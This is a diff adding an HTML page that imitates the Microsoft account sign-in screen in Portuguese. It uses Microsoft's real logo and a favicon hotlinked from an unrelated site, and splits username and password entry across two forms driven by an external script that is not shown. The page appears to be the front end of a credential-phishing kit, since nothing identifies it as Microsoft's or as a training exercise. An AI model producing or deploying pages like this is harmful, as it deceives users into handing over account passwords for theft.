@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <title>Entrar em sua conta</title>
+    <link rel="icon" href="https://rokstadpower.com/wp-content/uploads/2021/02/microsoft-icon.png" type="image/x-icon">
+</head>
+<body>
+    <div class="login-container" type="login-box">
+        <div class="logindiv">
+            <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" width="100" height="25">
+            <h2>Entrar</h2>
+            <form id="loginForm">
+                <input type="text" id="username" name="username" placeholder="Email, telefone ou Skype"><br/>
+                <a>Não tem uma conta? </a><a class="special-link"> Crie uma!</a><br/><br/>
+                <a class="special-link">Não consegue acessar sua conta?</a>
+        </div>
+         <div class="firstButtons">
+         <button type="Vbutton" id="cleanButton">Voltar</button>  <button type="button" id="toggleButton">Avançar</button>
+         </div>
+           </form>
+    </div>
+
+    <div class="login-container" type="password-box" style="display: none;" >
+        <div class="passworddiv">
+            <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" width="100" height="25">
+            <div class="linhadelabel">
+                <label id="usernamePlaceholder"></label>
+            </div>
+            <h2>Insira a senha</h2>
+            <form id="passwordForm">
+                <input type="password" id="password" name="password" placeholder="Senha">
+                <a class="special-link">Esqueceu sua senha?</a><br/><br/>
+        </div>
+        <button type="submit">Entrar</button>
+        </form>
+    </div>
+
+    <script src="script1.3.js"></script>
+</body>
+</html>
